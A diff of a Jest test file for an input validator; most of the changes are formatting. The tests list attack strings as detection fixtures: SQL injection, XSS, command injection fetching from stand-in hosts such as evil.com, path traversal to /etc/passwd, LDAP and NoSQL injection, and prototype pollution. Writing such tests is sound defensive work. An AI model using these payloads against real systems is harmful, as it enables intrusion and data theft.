@@ -1,10 +1,11 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 import { AdvancedInputValidator } from '../advanced-validation';
 
 describe('AdvancedInputValidator', () => {
   describe('Basic Input Validation', () => {
     it('should validate normal text input', () => {
       const result = AdvancedInputValidator.validateInput('Hello world');
-      
+
       expect(result.isValid).toBe(true);
       expect(result.errors).toHaveLength(0);
       expect(result.sanitized).toBe('Hello world');
@@ -22,7 +23,7 @@ describe('AdvancedInputValidator', () => {
     it('should enforce length limits', () => {
       const longInput = 'x'.repeat(100);
       const result = AdvancedInputValidator.validateInput(longInput, { maxLength: 50 });
-      
+
       expect(result.isValid).toBe(false);
       expect(result.errors[0]).toContain('exceeds maximum length');
     });
@@ -30,7 +31,7 @@ describe('AdvancedInputValidator', () => {
     it('should detect null bytes', () => {
       const input = 'test\x00string';
       const result = AdvancedInputValidator.validateInput(input);
-      
+
       expect(result.isValid).toBe(false);
       expect(result.errors[0]).toContain('null bytes');
     });
@@ -38,7 +39,7 @@ describe('AdvancedInputValidator', () => {
     it('should warn about control characters', () => {
       const input = 'test\x01\x02string';
       const result = AdvancedInputValidator.validateInput(input);
-      
+
       expect(result.isValid).toBe(true); // Warnings don't make it invalid
       expect(result.warnings[0]).toContain('control characters');
     });
@@ -48,19 +49,19 @@ describe('AdvancedInputValidator', () => {
     it('should detect SQL injection patterns', () => {
       const sqlInputs = [
         "'; DROP TABLE users; --",
-        "1 OR 1=1",
-        "UNION SELECT password FROM users",
+        '1 OR 1=1',
+        'UNION SELECT password FROM users',
         "admin'--",
         "1; WAITFOR DELAY '00:00:05'",
-        "SELECT * FROM information_schema.tables",
+        'SELECT * FROM information_schema.tables',
         "INSERT INTO users VALUES ('hacker', 'password')",
         "UPDATE users SET password='hacked' WHERE id=1",
-        "DELETE FROM users WHERE 1=1",
-        "CREATE TABLE malicious (id INT)",
-        "ALTER TABLE users ADD COLUMN hacked VARCHAR(255)",
+        'DELETE FROM users WHERE 1=1',
+        'CREATE TABLE malicious (id INT)',
+        'ALTER TABLE users ADD COLUMN hacked VARCHAR(255)',
         "EXEC xp_cmdshell 'dir'",
       ];
-      
+
       sqlInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.isValid).toBe(false);
@@ -81,7 +82,7 @@ describe('AdvancedInputValidator', () => {
         '<div onclick="alert(1)">Click me</div>',
         '<input onfocus="alert(1)" autofocus>',
       ];
-      
+
       xssInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.isValid).toBe(false);
@@ -108,7 +109,7 @@ describe('AdvancedInputValidator', () => {
         'curl http://malicious.com',
         'wget http://evil.com/payload',
       ];
-      
+
       cmdInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.isValid).toBe(false);
@@ -126,7 +127,7 @@ describe('AdvancedInputValidator', () => {
         'file:///etc/passwd',
         '....//....//etc/passwd',
       ];
-      
+
       pathInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.isValid).toBe(false);
@@ -141,7 +142,7 @@ describe('AdvancedInputValidator', () => {
         '*)(&(objectClass=user)',
         'test)(cn=*))(&(cn=*',
       ];
-      
+
       ldapInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.isValid).toBe(false);
@@ -158,7 +159,7 @@ describe('AdvancedInputValidator', () => {
         '{"$regex": ".*"}',
         '$where: function() { return true; }',
       ];
-      
+
       nosqlInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.isValid).toBe(false);
@@ -177,7 +178,7 @@ describe('AdvancedInputValidator', () => {
         'Claim your prize now before it expires',
         'Verify your identity to prevent account lockout',
       ];
-      
+
       phishingInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.warnings.length).toBeGreaterThan(0);
@@ -192,7 +193,7 @@ describe('AdvancedInputValidator', () => {
         'Exclusive investment opportunity in Ethereum',
         'Your crypto wallet private key is needed',
       ];
-      
+
       cryptoInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.warnings.length).toBeGreaterThan(0);
@@ -206,7 +207,7 @@ describe('AdvancedInputValidator', () => {
         'Help Ukraine now - donate immediately',
         'Support Israel emergency fund',
       ];
-      
+
       donationInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.warnings.length).toBeGreaterThan(0);
@@ -218,17 +219,13 @@ describe('AdvancedInputValidator', () => {
     it('should detect Base64 encoding', () => {
       const base64Input = 'SGVsbG8gV29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nPQ=='; // Long base64
       const result = AdvancedInputValidator.validateInput(base64Input);
-      
+
       expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
     });
 
     it('should detect hex encoding', () => {
-      const hexInputs = [
-        '0x48656c6c6f',
-        '\\x48\\x65\\x6c\\x6c\\x6f',
-        '%48%65%6c%6c%6f',
-      ];
-      
+      const hexInputs = ['0x48656c6c6f', '\\x48\\x65\\x6c\\x6c\\x6f', '%48%65%6c%6c%6f'];
+
       hexInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
@@ -238,7 +235,7 @@ describe('AdvancedInputValidator', () => {
     it('should detect Unicode escapes', () => {
       const unicodeInput = '\\u0048\\u0065\\u006c\\u006c\\u006f';
       const result = AdvancedInputValidator.validateInput(unicodeInput);
-      
+
       expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
     });
 
@@ -248,7 +245,7 @@ describe('AdvancedInputValidator', () => {
         '&#60;script&#62;alert(1)&#60;/script&#62;',
         '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
       ];
-      
+
       htmlEntityInputs.forEach(input => {
         const result = AdvancedInputValidator.validateInput(input);
         expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
@@ -260,7 +257,7 @@ describe('AdvancedInputValidator', () => {
     it('should warn about HTML when not allowed', () => {
       const htmlInput = '<div>Hello <b>World</b></div>';
       const result = AdvancedInputValidator.validateInput(htmlInput, { allowHTML: false });
-      
+
       expect(result.isValid).toBe(true); // Warnings don't make it invalid
       expect(result.warnings.some(warning => warning.includes('HTML tags detected'))).toBe(true);
     });
@@ -268,22 +265,24 @@ describe('AdvancedInputValidator', () => {
     it('should allow HTML when explicitly allowed', () => {
       const htmlInput = '<div>Hello <b>World</b></div>';
       const result = AdvancedInputValidator.validateInput(htmlInput, { allowHTML: true });
-      
+
       expect(result.isValid).toBe(true);
     });
 
     it('should warn about URLs when not allowed', () => {
       const urlInput = 'Check out https://example.com for more info';
       const result = AdvancedInputValidator.validateInput(urlInput, { allowURLs: false });
-      
+
       expect(result.warnings.some(warning => warning.includes('URLs detected'))).toBe(true);
     });
 
     it('should warn about emails when not allowed', () => {
       const emailInput = 'Contact us at support@example.com';
       const result = AdvancedInputValidator.validateInput(emailInput, { allowEmails: false });
-      
-      expect(result.warnings.some(warning => warning.includes('Email addresses detected'))).toBe(true);
+
+      expect(result.warnings.some(warning => warning.includes('Email addresses detected'))).toBe(
+        true
+      );
     });
   });
 
@@ -291,12 +290,14 @@ describe('AdvancedInputValidator', () => {
     it('should validate against custom patterns', () => {
       const customPattern = /\b(secret|confidential|private)\b/i;
       const input = 'This is a secret document';
-      
+
       const result = AdvancedInputValidator.validateInput(input, {
         customPatterns: [customPattern],
       });
-      
-      expect(result.warnings.some(warning => warning.includes('Custom pattern matched'))).toBe(true);
+
+      expect(result.warnings.some(warning => warning.includes('Custom pattern matched'))).toBe(
+        true
+      );
     });
   });
 
@@ -304,7 +305,7 @@ describe('AdvancedInputValidator', () => {
     it('should validate proper JSON', () => {
       const validJson = '{"name": "test", "value": 123}';
       const result = AdvancedInputValidator.validateJSON(validJson);
-      
+
       expect(result.isValid).toBe(true);
       expect(result.errors).toHaveLength(0);
     });
@@ -312,7 +313,7 @@ describe('AdvancedInputValidator', () => {
     it('should reject invalid JSON', () => {
       const invalidJson = '{"name": "test", "value":}';
       const result = AdvancedInputValidator.validateJSON(invalidJson);
-      
+
       expect(result.isValid).toBe(false);
       expect(result.errors[0]).toContain('Invalid JSON');
     });
@@ -320,25 +321,25 @@ describe('AdvancedInputValidator', () => {
     it('should detect prototype pollution attempts', () => {
       const maliciousJson = '{"__proto__": {"isAdmin": true}}';
       const result = AdvancedInputValidator.validateJSON(maliciousJson);
-      
+
       expect(result.isValid).toBe(false);
       expect(result.errors[0]).toContain('prototype pollution');
     });
 
     it('should warn about deeply nested objects', () => {
       const deepObject = JSON.stringify({
-        a: { b: { c: { d: { e: { f: { g: { h: { i: { j: { k: 'deep' } } } } } } } } } }
+        a: { b: { c: { d: { e: { f: { g: { h: { i: { j: { k: 'deep' } } } } } } } } } },
       });
-      
+
       const result = AdvancedInputValidator.validateJSON(deepObject);
-      
+
       expect(result.warnings.some(warning => warning.includes('nesting depth'))).toBe(true);
     });
 
     it('should warn about large arrays', () => {
       const largeArray = JSON.stringify({ data: new Array(1500).fill('item') });
       const result = AdvancedInputValidator.validateJSON(largeArray);
-      
+
       expect(result.warnings.some(warning => warning.includes('Large array'))).toBe(true);
     });
   });
@@ -350,7 +351,7 @@ describe('AdvancedInputValidator', () => {
         checkForMaliciousPatterns: false, // Disable to test sanitization
         allowHTML: false,
       });
-      
+
       expect(result.isValid).toBe(true);
       expect(result.sanitized).toBe('Hello &lt;script&gt;alert(1)&lt;&#x2F;script&gt; World');
     });
@@ -360,7 +361,7 @@ describe('AdvancedInputValidator', () => {
       const result = AdvancedInputValidator.validateInput(input, {
         checkForMaliciousPatterns: false,
       });
-      
+
       expect(result.sanitized).toBe('Hello World');
     });
 
@@ -370,7 +371,7 @@ describe('AdvancedInputValidator', () => {
         allowHTML: true,
         checkForMaliciousPatterns: false,
       });
-      
+
       expect(result.sanitized).toBe('<div>Hello <b>World</b></div>');
     });
   });
